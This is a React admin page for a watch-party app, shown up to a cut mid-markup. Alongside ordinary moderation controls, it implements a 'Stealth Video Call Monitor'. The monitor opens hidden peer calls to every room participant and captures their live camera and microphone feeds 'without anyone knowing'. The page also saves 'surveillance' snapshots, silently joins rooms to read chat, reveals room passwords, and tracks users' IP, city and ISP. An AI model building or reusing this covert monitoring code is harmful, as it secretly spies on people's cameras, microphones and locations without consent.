'use client';
import { useState, useEffect, useRef, useCallback } from 'react';
import Link from 'next/link';
import {
  Shield, ShieldAlert, ShieldCheck, Lock, Unlock, Users, Film, Pause, Play,
  Square, Ban, Trash2, RefreshCw, Eye, EyeOff, Search, AlertTriangle,
  CheckCircle, Video, Flame, Clock, Key, ArrowRight, ExternalLink, LogOut,
  Copy, Radio, Sparkles, X, MapPin, Globe, Compass, Navigation, Activity, Wifi,
  Volume2, VolumeX, Maximize2, Heart, Camera, Mic, MicOff, VideoOff, ChevronDown, ChevronUp
} from 'lucide-react';
import { serverUrl, getSocket } from '@/lib/socket';
import BrandLogo from '@/components/BrandLogo';
import CallErrorBoundary from '@/components/CallErrorBoundary';

const fmt = (s) => {
  s = Math.max(0, Math.floor(s || 0));
  const m = Math.floor(s / 60);
  const sec = s % 60;
  return `${m}:${sec < 10 ? '0' : ''}${sec}`;
};

// Haversine distance calculator between two coordinates (km)
const haversineKm = (lat1, lon1, lat2, lon2) => {
  const l1 = Number(lat1), o1 = Number(lon1), l2 = Number(lat2), o2 = Number(lon2);
  if (!l1 || !o1 || !l2 || !o2 || isNaN(l1) || isNaN(o1) || isNaN(l2) || isNaN(o2)) return null;
  const toRad = (x) => (x * Math.PI) / 180;
  const R = 6371;
  const dLat = toRad(l2 - l1);
  const dLon = toRad(o2 - o1);
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(toRad(l1)) * Math.cos(toRad(l2)) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return Math.round(R * c);
};

// Stealth Video Tile for Admin Monitor
function StealthVideoTile({ stream, user, listenAudio }) {
  const videoRef = useRef(null);
  const audioRef = useRef(null);
  const [hasVideo, setHasVideo] = useState(false);
  const [individualMute, setIndividualMute] = useState(null); // null = inherit listenAudio, boolean = manual toggle
  const [snapshotTaken, setSnapshotTaken] = useState(false);

  const effectiveAudio = individualMute !== null ? !individualMute : Boolean(listenAudio);

  useEffect(() => {
    if (!videoRef.current) return;
    try {
      if (stream && typeof stream.getVideoTracks === 'function') {
        videoRef.current.srcObject = stream;
        const vTracks = stream.getVideoTracks() || [];
        setHasVideo(vTracks.length > 0 && vTracks.some((t) => t.enabled));
        videoRef.current.play().catch(() => {});
      } else {
        videoRef.current.srcObject = null;
        setHasVideo(false);
      }
    } catch (e) {
      console.warn('StealthVideoTile video error:', e);
      try { videoRef.current.srcObject = null; } catch {}
      setHasVideo(false);
    }
  }, [stream]);

  useEffect(() => {
    if (!audioRef.current) return;
    try {
      if (stream) {
        audioRef.current.srcObject = stream;
        audioRef.current.muted = !effectiveAudio;
        if (effectiveAudio) {
          audioRef.current.play().catch(() => {});
        }
      } else {
        audioRef.current.srcObject = null;
      }
    } catch (e) {
      console.warn('StealthVideoTile audio error:', e);
    }
  }, [stream, effectiveAudio]);

  const handleFullscreen = () => {
    if (!videoRef.current) return;
    try {
      if (videoRef.current.requestFullscreen) {
        videoRef.current.requestFullscreen();
      } else if (videoRef.current.webkitRequestFullscreen) {
        videoRef.current.webkitRequestFullscreen();
      } else if (videoRef.current.webkitEnterFullscreen) {
        videoRef.current.webkitEnterFullscreen();
      }
    } catch {}
  };

  const handleCapture = () => {
    if (!videoRef.current) return;
    try {
      setSnapshotTaken(true);
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
        const url = canvas.toDataURL('image/png');
        const a = document.createElement('a');
        a.href = url;
        a.download = `surveillance-${(user?.name || 'caller').replace(/\s+/g, '_')}-${Date.now()}.png`;
        a.click();
      }
      setTimeout(() => setSnapshotTaken(false), 800);
    } catch (e) {
      console.warn('Snapshot error:', e);
      setSnapshotTaken(false);
    }
  };

  return (
    <div className="relative aspect-video rounded-xl bg-black/95 border border-purple-500/30 overflow-hidden shadow-2xl group transition-all duration-200 hover:border-pink-500/60">
      <audio ref={audioRef} autoPlay playsInline />
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className={`w-full h-full object-cover ${hasVideo ? 'block' : 'hidden'}`}
      />
      {!hasVideo && (
        <div className="absolute inset-0 flex flex-col items-center justify-center p-3 text-center bg-gradient-to-b from-purple-950/40 to-black/90">
          <div className="h-10 w-10 rounded-full bg-purple-500/20 border border-purple-500/40 flex items-center justify-center text-purple-300 mb-2 animate-pulse">
            <Video className="h-5 w-5" />
          </div>
          <span className="text-xs font-bold text-white truncate max-w-[160px]">{user?.name || 'Participant'}</span>
          <span className="text-[10px] text-purple-300/70 mt-0.5">Connecting stealth video feed…</span>
        </div>
      )}

      {/* Top Overlay Badge */}
      <div className="absolute top-2 left-2 right-2 flex items-center justify-between pointer-events-none">
        <div className="flex items-center gap-1.5 bg-black/80 backdrop-blur-md px-2 py-0.5 rounded-lg border border-white/10 max-w-[65%]">
          <span className="h-2 w-2 rounded-full shrink-0" style={{ backgroundColor: user?.color || '#ec4899' }} />
          <span className="text-[10px] font-bold text-white truncate">{user?.name || 'User'}</span>
          {user?.isHost && (
            <span className="text-[8px] bg-amber-500/30 text-amber-300 px-1 rounded font-bold uppercase shrink-0">Host</span>
          )}
        </div>

        <div className="flex items-center gap-1">
          {hasVideo ? (
            <span className="px-1.5 py-0.5 rounded-md bg-emerald-500/25 text-emerald-300 border border-emerald-500/40 text-[9px] font-bold flex items-center gap-1">
              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
              <span>LIVE</span>
            </span>
          ) : (
            <span className="px-1.5 py-0.5 rounded-md bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[9px] font-medium">
              Awaiting Feed
            </span>
          )}
        </div>
      </div>

      {/* Bottom Overlay Controls & Info */}
      <div className="absolute bottom-2 left-2 right-2 flex items-center justify-between text-[10px] text-white/80 pointer-events-none">
        <div className="flex items-center gap-1 bg-black/75 px-1.5 py-0.5 rounded backdrop-blur-sm text-[9px] font-mono text-slate-300">
          <span>{user?.geo?.flag || '📍'}</span>
          <span className="truncate max-w-[85px]">{user?.geo?.city || (user?.id || user?.cid || '').slice(0, 8)}</span>
        </div>

        {/* Action Controls */}
        <div className="flex items-center gap-1 pointer-events-auto">
          {/* Individual Audio Mute/Unmute */}
          <button
            type="button"
            onClick={() => setIndividualMute(effectiveAudio)}
            className={`p-1 rounded transition cursor-pointer ${
              effectiveAudio
                ? 'bg-rose-600 hover:bg-rose-500 text-white shadow-sm'
                : 'bg-black/70 hover:bg-black text-white/70 hover:text-white'
            }`}
            title={effectiveAudio ? 'Mute this participant' : 'Listen to this participant'}
          >
            {effectiveAudio ? <Volume2 className="h-3 w-3" /> : <VolumeX className="h-3 w-3" />}
          </button>

          {/* Screenshot / Snapshot Frame */}
          {hasVideo && (
            <button
              type="button"
              onClick={handleCapture}
              disabled={snapshotTaken}
              className="p-1 rounded bg-black/70 hover:bg-black text-white/70 hover:text-white transition cursor-pointer"
              title="Capture surveillance snapshot image"
            >
              <Camera className={`h-3 w-3 ${snapshotTaken ? 'text-pink-400 animate-spin' : ''}`} />
            </button>
          )}

          {/* Fullscreen */}
          <button
            type="button"
            onClick={handleFullscreen}
            className="p-1 rounded bg-black/70 hover:bg-black text-white/70 hover:text-white transition cursor-pointer"
            title="Fullscreen video feed"
          >
            <Maximize2 className="h-3 w-3" />
          </button>
        </div>
      </div>
    </div>
  );
}

// Stealth Call Monitor for Aurelia Admin Panel
function StealthCallMonitor({ roomId, users = [], externalListenAudio = false }) {
  const [remoteStreams, setRemoteStreams] = useState({});
  const [listenAudio, setListenAudio] = useState(externalListenAudio);
  const [connecting, setConnecting] = useState(true);
  const peerRef = useRef(null);
  const activeCalls = useRef(new Map());

  // Sync with external master audio toggle if passed
  useEffect(() => {
    setListenAudio(externalListenAudio);
  }, [externalListenAudio]);

  // Helper to create blank video track
  const createBlankStream = () => {
    if (typeof document === 'undefined') return null;
    try {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.fillStyle = '#070512';
        ctx.fillRect(0, 0, 320, 240);
      }
      const stream = canvas.captureStream ? canvas.captureStream(5) : (canvas.webkitCaptureStream ? canvas.webkitCaptureStream(5) : null);
      if (stream && stream.getVideoTracks().length > 0) return stream;
    } catch {}
    // If canvas stream is unavailable (e.g. mobile Safari), create dummy silent track to prevent empty-stream PeerJS errors
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) {
        const actx = new AudioCtx();
        const osc = actx.createOscillator();
        const dst = actx.createMediaStreamDestination();
        osc.connect(dst);
        osc.start();
        const trk = dst.stream.getAudioTracks()[0];
        if (trk) {
          trk.enabled = false;
          return new MediaStream([trk]);
        }
      }
    } catch {}
    return new MediaStream();
  };

  useEffect(() => {
    let peer = null;
    let dead = false;
    const ghostCid = 'aurelia_ghost_' + Math.random().toString(36).slice(2, 9);
    const blankStream = createBlankStream() || new MediaStream();

    const callAllUsers = () => {
      if (!peerRef.current || dead) return;
      users.forEach((u) => {
        const targetId = u.id || u.cid;
        if (!targetId || activeCalls.current.has(targetId)) return;

        try {
          const call = peerRef.current.call(targetId, blankStream, {
            metadata: { type: 'cam', isGhost: true }
          });
          if (!call) return;
          activeCalls.current.set(targetId, call);

          call.on('stream', (stream) => {
            if (dead) return;
            setRemoteStreams((prev) => ({ ...prev, [targetId]: stream }));
          });

          call.on('close', () => {
            activeCalls.current.delete(targetId);
            setRemoteStreams((prev) => {
              const next = { ...prev };
              delete next[targetId];
              return next;
            });
          });

          call.on('error', () => {
            activeCalls.current.delete(targetId);
          });
        } catch {}
      });
    };

    const initPeer = async () => {
      try {
        const { default: Peer } = await import('peerjs');
        if (dead) return;

        let iceServers = [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'stun:stun2.l.google.com:19302' },
        ];
        let peerKey = 'peerjs';

        try {
          const res = await fetch(`${serverUrl()}/api/ice`);
          if (res.ok) {
            const j = await res.json();
            if (j.iceServers) iceServers = j.iceServers;
            if (j.peerKey) peerKey = j.peerKey;
          }
        } catch {}

        let rawUrl = '';
        try { rawUrl = serverUrl(); } catch {}
        if (!rawUrl && typeof window !== 'undefined') rawUrl = window.location.origin;
        const u = new URL(rawUrl || 'http://localhost:3000');

        peer = new Peer(ghostCid, {
          host: u.hostname,
          port: +u.port || (u.protocol === 'https:' ? 443 : 80),
          path: '/peerjs',
          secure: u.protocol === 'https:',
          config: { iceServers },
          key: peerKey,
        });
        peerRef.current = peer;

        peer.on('open', () => {
          if (dead) return;
          setConnecting(false);
          callAllUsers();
        });

        peer.on('error', (err) => {
          console.warn('Stealth monitor peer warning:', err);
        });
      } catch (e) {
        console.warn('Failed to start stealth peer:', e);
      }
    };

    initPeer();

    const interval = setInterval(callAllUsers, 3000);

    return () => {
      dead = true;
      clearInterval(interval);
      activeCalls.current.forEach((c) => {
        try { c.close(); } catch {}
      });
      activeCalls.current.clear();
      peer?.destroy();
      peerRef.current = null;
    };
  }, [roomId, JSON.stringify(users.map((u) => u.id || u.cid))]);

  const activeStreamCount = Object.keys(remoteStreams).length;

  return (
    <div className="rounded-xl border border-purple-500/30 bg-black/70 p-4 space-y-3">
      {/* Header */}
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-white/10 pb-2.5">
        <div className="flex items-center gap-2">
          <div className="h-7 w-7 rounded-lg bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-300">
            <Video className="h-4 w-4" />
          </div>
          <div>
            <h4 className="text-xs sm:text-sm font-bold text-white flex items-center gap-2 flex-wrap">
              <span>Stealth Video Call Monitor</span>
              <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 border border-purple-500/40 text-purple-300 font-semibold">
                100% Hidden &bull; 0 Cam/Mic Used
              </span>
              {activeStreamCount > 0 && (
                <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-semibold flex items-center gap-1">
                  <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
                  <span>{activeStreamCount} Live Feed{activeStreamCount > 1 ? 's' : ''}</span>
                </span>
              )}
            </h4>
            <p className="text-[10px] text-slate-400">View real-time participant cameras silently without anyone knowing</p>
          </div>
        </div>

        <button
          type="button"
          onClick={() => setListenAudio(!listenAudio)}
          className={`px-3 py-1.5 rounded-xl border text-xs font-semibold flex items-center gap-1.5 transition cursor-pointer ${
            listenAudio
              ? 'bg-rose-600 border-rose-500 text-white shadow-lg shadow-rose-600/30'
              : 'bg-white/10 border-white/15 text-slate-300 hover:text-white'
          }`}
          title={listenAudio ? 'Mute room call audio' : 'Listen to room call audio'}
        >
          {listenAudio ? <Volume2 className="h-3.5 w-3.5" /> : <VolumeX className="h-3.5 w-3.5" />}
          <span>{listenAudio ? 'Audio Live 🔊' : 'Audio Muted 🔇'}</span>
        </button>
      </div>

      {/* Video Grid */}
      {users.length === 0 ? (
        <div className="text-center py-8 text-xs text-slate-400 border border-dashed border-white/10 rounded-xl">
          Waiting for users to join room…
        </div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {users.map((u) => {
            const targetId = u.id || u.cid;
            const stream = remoteStreams[targetId];
            return (
              <StealthVideoTile
                key={targetId}
                user={u}
                stream={stream}
                listenAudio={listenAudio}
              />
            );
          })}
        </div>
      )}
    </div>
  );
}

export default function AdminPage() {
  const [adminKey, setAdminKey] = useState('');
  const [keyInput, setKeyInput] = useState('');
  const [showKey, setShowKey] = useState(false);
  const [authed, setAuthed] = useState(false);
  const [authError, setAuthError] = useState('');
  const [loading, setLoading] = useState(false);

  const [data, setData] = useState({
    stats: {
      totalRooms: 0,
      totalConnectedUsers: 0,
      activePlayingCount: 0,
      blockedUsersCount: 0,
      blockedRoomsCount: 0,
      blockedVideosCount: 0,
    },
    rooms: [],
    blocked: { users: [], ips: [], rooms: [], videos: [] },
  });

  const [activeTab, setActiveTab] = useState('rooms'); // 'rooms' | 'videocalls' | 'locations' | 'security' | 'broadcast'
  const [expandedCallRooms, setExpandedCallRooms] = useState({});
  const [globalListenAudio, setGlobalListenAudio] = useState(false);
  const [search, setSearch] = useState('');
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [toast, setToast] = useState(null);
  const toastTimer = useRef();

  // Room Password reveal state
  const [revealedPasswords, setRevealedPasswords] = useState({});

  // Ghost Spectator Monitor Modal State
  const [ghostModal, setGhostModal] = useState({ open: false, roomId: '', data: null });
  const [ghostSyncState, setGhostSyncState] = useState(null);
  const [ghostChat, setGhostChat] = useState([]);

  // Interactive Map Pinpoint Modal State
  const [mapModal, setMapModal] = useState({ open: false, user: null, roomId: '' });

  // Override Video Modal
  const [overrideModal, setOverrideModal] = useState({ open: false, roomId: '', src: '', title: '' });
  // Broadcast message
  const [broadcastMsg, setBroadcastMsg] = useState('');
  // Manual block video URL input
  const [manualBlockUrl, setManualBlockUrl] = useState('');

  const say = (msg, type = 'success') => {
    setToast({ msg, type, n: Date.now() });
    clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), 3000);
  };

  const handleGhostJoin = (roomId) => {
    setGhostModal({ open: true, roomId, data: null });
    const sock = getSocket();
    if (!sock.connected) sock.connect();
    sock.emit('admin:ghost_join', { roomId, adminKey }, (res) => {
      if (res?.ok) {
        setGhostSyncState(res);
        setGhostChat(res.chat || []);
      } else {
        say(res?.message || 'Failed to ghost join', 'error');
      }
    });

    sock.on('player', (p) => {
      setGhostSyncState((prev) => (prev ? { ...prev, playing: p.action === 'PLAY', time: p.time } : prev));
    });
    sock.on('state', (st) => {
      setGhostSyncState((prev) => (prev ? { ...prev, media: st.media, playing: st.playing, time: st.time } : prev));
    });
    sock.on('chat', (msg) => {
      setGhostChat((prev) => [...prev.slice(-99), msg]);
    });
  };

  const handleCloseGhost = () => {
    const sock = getSocket();
    if (ghostModal.roomId) {
      sock.emit('admin:ghost_leave', { roomId: ghostModal.roomId });
    }
    sock.off('player');
    sock.off('state');
    sock.off('chat');
    setGhostModal({ open: false, roomId: '', data: null });
    setGhostSyncState(null);
    setGhostChat([]);
  };

  // Restore stored admin key on mount
  useEffect(() => {
    const saved = sessionStorage.getItem('sc_admin_key');
    if (saved) {
      setAdminKey(saved);
      verifyKey(saved);
    }
  }, []);

  const verifyKey = async (k) => {
    setLoading(true);
    setAuthError('');
    try {
      const res = await fetch(serverUrl() + '/api/admin/verify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': k.trim(),
        },
      });
      if (res.ok) {
        setAuthed(true);
        sessionStorage.setItem('sc_admin_key', k.trim());
        setAdminKey(k.trim());
        fetchOverview(k.trim());
      } else {
        setAuthed(false);
        setAuthError('Invalid administrator credentials.');
      }
    } catch (e) {
      setAuthError('Could not connect to server. Ensure backend is running.');
    } finally {
      setLoading(false);
    }
  };

  const handleLogin = (e) => {
    e.preventDefault();
    if (!keyInput.trim()) return;
    verifyKey(keyInput.trim());
  };

  const handleLogout = () => {
    sessionStorage.removeItem('sc_admin_key');
    setAuthed(false);
    setAdminKey('');
    setKeyInput('');
  };

  const fetchOverview = useCallback(async (k = adminKey) => {
    if (!k) return;
    try {
      const res = await fetch(serverUrl() + '/api/admin/overview', {
        headers: { 'x-admin-key': k },
        cache: 'no-store',
      });
      if (res.ok) {
        const json = await res.json();
        setData({
          stats: json.stats || {},
          rooms: Array.isArray(json.rooms) ? json.rooms : [],
          blocked: json.blocked || { users: [], ips: [], rooms: [], videos: [] },
        });
      } else if (res.status === 401) {
        setAuthed(false);
        sessionStorage.removeItem('sc_admin_key');
      }
    } catch (e) {
      // offline / quiet
    }
  }, [adminKey]);

  // Auto-refresh interval
  useEffect(() => {
    if (!authed || !autoRefresh) return;
    fetchOverview();
    const interval = setInterval(() => fetchOverview(), 3000);
    return () => clearInterval(interval);
  }, [authed, autoRefresh, fetchOverview]);

  // Admin Control Actions
  const handleVideoControl = async (roomId, action, payload = {}) => {
    try {
      const res = await fetch(serverUrl() + '/api/admin/video/control', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ roomId, action, payload }),
      });
      if (res.ok) {
        say(`Video action "${action}" applied to room ${roomId}`);
        fetchOverview();
      } else {
        say('Failed to apply video control', 'error');
      }
    } catch {
      say('Network error applying video control', 'error');
    }
  };

  const handleBlockRoom = async (roomId) => {
    if (!confirm(`Are you sure you want to TERMINATE & BLOCK room "${roomId}"? All users will be disconnected.`)) return;
    try {
      const res = await fetch(serverUrl() + '/api/admin/room/block', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ roomId, reason: 'Closed by administrator for security' }),
      });
      if (res.ok) {
        say(`Room "${roomId}" blocked and terminated`);
        fetchOverview();
      }
    } catch {
      say('Failed to block room', 'error');
    }
  };

  const handleUnblockRoom = async (roomId) => {
    try {
      const res = await fetch(serverUrl() + '/api/admin/room/unblock', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ roomId }),
      });
      if (res.ok) {
        say(`Room "${roomId}" unblocked`);
        fetchOverview();
      }
    } catch {
      say('Failed to unblock room', 'error');
    }
  };


  const handleBlockUser = async (user, roomId) => {
    const reason = prompt(`Reason for blocking "${user.name}" (CID: ${user.cid}):`, 'Violation of security policies');
    if (reason === null) return;
    try {
      const res = await fetch(serverUrl() + '/api/admin/user/block', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ cid: user.cid, ip: user.ip, roomId, reason }),
      });
      if (res.ok) {
        say(`User "${user.name}" (${user.cid}) has been blocked and kicked`);
        fetchOverview();
      }
    } catch {
      say('Failed to block user', 'error');
    }
  };

  const handleUnblockUser = async (u) => {
    try {
      const res = await fetch(serverUrl() + '/api/admin/user/unblock', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ cid: u.cid, ip: u.ip }),
      });
      if (res.ok) {
        say(`User unblocked`);
        fetchOverview();
      }
    } catch {
      say('Failed to unblock user', 'error');
    }
  };

  const handleBlockVideoUrl = async (url) => {
    if (!url) return;
    if (!confirm(`Are you sure you want to BLACKLIST this video URL?\n\n${url}\n\nIt will immediately stop playing in all rooms and cannot be played again.`)) return;
    try {
      const res = await fetch(serverUrl() + '/api/admin/video/control', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ roomId: 'global', action: 'block', payload: { src: url } }),
      });
      if (res.ok) {
        say('Video URL has been blacklisted and stopped');
        setManualBlockUrl('');
        fetchOverview();
      }
    } catch {
      say('Failed to blacklist video', 'error');
    }
  };

  const handleUnblockVideo = async (src) => {
    try {
      const res = await fetch(serverUrl() + '/api/admin/video/unblock', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ src }),
      });
      if (res.ok) {
        say('Video URL unblocked');
        fetchOverview();
      }
    } catch {
      say('Failed to unblock video', 'error');
    }
  };

  const handleOverrideSubmit = async (e) => {
    e.preventDefault();
    if (!overrideModal.roomId || !overrideModal.src) return;
    try {
      const res = await fetch(serverUrl() + '/api/admin/video/override', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({
          roomId: overrideModal.roomId,
          media: {
            type: 'auto',
            src: overrideModal.src.trim(),
            title: overrideModal.title.trim() || 'Broadcast Stream',
          },
        }),
      });
      if (res.ok) {
        say(`Video override sent to room ${overrideModal.roomId}`);
        setOverrideModal({ open: false, roomId: '', src: '', title: '' });
        fetchOverview();
      }
    } catch {
      say('Failed to override video', 'error');
    }
  };

  const handleClearQueue = async (roomId) => {
    if (!confirm(`Clear upcoming video queue for room "${roomId}"?`)) return;
    try {
      const res = await fetch(serverUrl() + '/api/admin/queue/clear', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ roomId }),
      });
      if (res.ok) {
        say(`Queue cleared for room ${roomId}`);
        fetchOverview();
      }
    } catch {
      say('Failed to clear queue', 'error');
    }
  };

  const handleBroadcast = async (e) => {
    e.preventDefault();
    if (!broadcastMsg.trim()) return;
    try {
      const res = await fetch(serverUrl() + '/api/admin/broadcast', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey,
        },
        body: JSON.stringify({ message: broadcastMsg.trim() }),
      });
      if (res.ok) {
        say(`Broadcast message dispatched to all active couches`);
        setBroadcastMsg('');
      }
    } catch {
      say('Failed to send broadcast', 'error');
    }
  };

  // Filtered rooms (supports searching by city, country, IP, name, and room ID)
  const filteredRooms = data.rooms.filter((r) => {
    if (!search.trim()) return true;
    const q = search.toLowerCase();
    const matchesId = r.roomId?.toLowerCase().includes(q);
    const matchesTitle = r.media?.title?.toLowerCase().includes(q) || r.media?.src?.toLowerCase().includes(q);
    const matchesUser = r.users?.some((u) =>
      u.name?.toLowerCase().includes(q) ||
      u.cid?.toLowerCase().includes(q) ||
      u.ip?.includes(q) ||
      u.geo?.city?.toLowerCase().includes(q) ||
      u.geo?.country?.toLowerCase().includes(q) ||
      u.geo?.region?.toLowerCase().includes(q)
    );
    return matchesId || matchesTitle || matchesUser;
  });

  // All online members flattened for Locations Tab
  const allConnectedUsers = [];
  data.rooms.forEach((r) => {
    if (Array.isArray(r.users)) {
      r.users.forEach((u) => {
        allConnectedUsers.push({
          ...u,
          roomId: r.roomId,
          mediaTitle: r.media?.title || r.media?.src || 'No Stream',
          isPlaying: r.playing,
        });
      });
    }
  });

  const filteredUsers = allConnectedUsers.filter((u) => {
    if (!search.trim()) return true;
    const q = search.toLowerCase();
    return (
      u.name?.toLowerCase().includes(q) ||
      u.cid?.toLowerCase().includes(q) ||
      u.ip?.includes(q) ||
      u.roomId?.toLowerCase().includes(q) ||
      u.geo?.city?.toLowerCase().includes(q) ||
      u.geo?.region?.toLowerCase().includes(q) ||
      u.geo?.country?.toLowerCase().includes(q) ||
      u.geo?.isp?.toLowerCase().includes(q)
    );
  });



  // ------------------ LOGIN SCREEN (SOFT BLACK GRADIENT) ------------------
  if (!authed) {
    return (
      <main className="relative min-h-screen grid place-items-center overflow-hidden bg-[radial-gradient(ellipse_100%_90%_at_50%_-20%,#181824,rgba(10,10,14,0.98)_50%,#000000_100%)] px-6 text-white font-sans selection:bg-[#d9467a]/30">
        <div aria-hidden className="absolute inset-0 bg-[radial-gradient(ellipse_80%_50%_at_50%_0%,rgba(217,70,122,0.12),transparent_70%),radial-gradient(circle_at_20%_80%,rgba(99,102,241,0.08),transparent_50%)]" />

        <div className="relative w-full max-w-md rounded-2xl border border-white/10 bg-black/90 p-8 text-center space-y-6">
          <div className="flex flex-col items-center justify-center space-y-2">
            <BrandLogo size="md" href="/" />
            <div className="pt-2">
              <h2 className="text-xl font-bold tracking-tight text-white">Aurelia Control Console</h2>
              <p className="mt-1 text-xs text-white/60">
                Live Room Supervision &amp; Member Geolocation Radar
              </p>
            </div>
          </div>

          <form onSubmit={handleLogin} className="space-y-4 text-left">
            <div>
              <label className="block text-xs font-medium text-white/80 mb-1.5 flex items-center gap-1.5">
                <Key className="h-3.5 w-3.5 text-[#ff6fa0]" />
                <span>Aurelia Secret Key</span>
              </label>
              <div className="relative">
                <input
                  autoFocus
                  type={showKey ? 'text' : 'password'}
                  value={keyInput}
                  onChange={(e) => setKeyInput(e.target.value)}
                  placeholder="Enter Aurelia master key"
                  className="w-full rounded-xl bg-white/5 border border-white/15 px-3.5 py-2.5 text-sm text-white placeholder-white/30 focus:border-[#d9467a] focus:outline-none focus:ring-1 focus:ring-[#d9467a] transition pr-10"
                />
                <button
                  type="button"
                  onClick={() => setShowKey(!showKey)}
                  className="absolute right-2.5 top-2.5 text-white/50 hover:text-white p-1 rounded-lg transition"
                >
                  {showKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
              {authError && <p className="mt-2 text-xs text-rose-400 font-medium">{authError}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-xl bg-[#d9467a] hover:bg-[#b3305d] py-3 text-sm font-semibold text-white active:scale-[0.99] transition flex items-center justify-center gap-2"
            >
              <ShieldCheck className="h-4 w-4" />
              <span>{loading ? 'Authenticating…' : 'Access Aurelia Console'}</span>
            </button>
          </form>

          <div className="border-t border-white/10 pt-4 flex items-center justify-between text-xs text-white/50">
            <span>Confidential Aurelia Console</span>
            <Link href="/" className="hover:text-white transition flex items-center gap-1">
              <span>Back to Cinema</span>
              <ArrowRight className="h-3 w-3" />
            </Link>
          </div>
        </div>
      </main>
    );
  }

  // ------------------ MAIN ADMIN DASHBOARD ------------------
  const totalBlocked = (data.blocked.users?.length || 0) + (data.blocked.rooms?.length || 0) + (data.blocked.videos?.length || 0);

  return (
    <div className="relative min-h-screen bg-[radial-gradient(ellipse_100%_90%_at_50%_-20%,#181824,rgba(10,10,14,0.98)_50%,#000000_100%)] text-slate-100 flex flex-col font-sans selection:bg-[#d9467a]/30">
      {/* Background Soft Glow Ambience */}
      <div aria-hidden className="pointer-events-none fixed inset-0 bg-[radial-gradient(circle_at_25%_15%,rgba(217,70,122,0.06),transparent_40%),radial-gradient(circle_at_80%_80%,rgba(99,102,241,0.05),transparent_40%)]" />

      {/* Top Header */}
      <header className="sticky top-0 z-40 border-b border-white/10 bg-black/60 backdrop-blur-2xl px-4 py-3 sm:px-6">
        <div className="mx-auto flex max-w-7xl items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <BrandLogo size="sm" href="/" />
            <div className="h-6 w-px bg-white/10 hidden sm:block" />
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-sm sm:text-base font-bold tracking-tight text-white flex items-center gap-2">
                  <Shield className="h-4 w-4 text-[#ff6fa0]" />
                  <span>Aurelia Security Console</span>
                </h1>
                <span className="rounded-full bg-emerald-500/15 border border-emerald-500/30 px-2 py-0.5 text-[10px] font-semibold text-emerald-400 flex items-center gap-1">
                  <span className="h-1.5 w-1.5 rounded-full bg-emerald-400" />
                  Live Monitor
                </span>
              </div>
              <p className="text-[11px] text-white/50 hidden sm:block">Room supervision, GPS radar &amp; safety</p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => setAutoRefresh(!autoRefresh)}
              className={`rounded-lg px-2.5 py-1.5 text-xs font-medium border transition flex items-center gap-1.5 ${
                autoRefresh
                  ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
                  : 'bg-white/5 border-white/10 text-white/60 hover:text-white'
              }`}
              title={autoRefresh ? 'Auto-refresh active (every 3s)' : 'Auto-refresh paused'}
            >
              <Radio className={`h-3 w-3 ${autoRefresh ? 'text-emerald-400' : ''}`} />
              <span className="hidden sm:inline">Auto 3s</span>
            </button>

            <button
              type="button"
              onClick={() => fetchOverview()}
              className="rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 p-2 text-white/70 hover:text-white transition"
              title="Refresh overview immediately"
            >
              <RefreshCw className="h-4 w-4" />
            </button>

            <button
              type="button"
              onClick={handleLogout}
              className="rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 px-3 py-1.5 text-xs text-rose-300 transition flex items-center gap-1.5"
            >
              <LogOut className="h-3.5 w-3.5" />
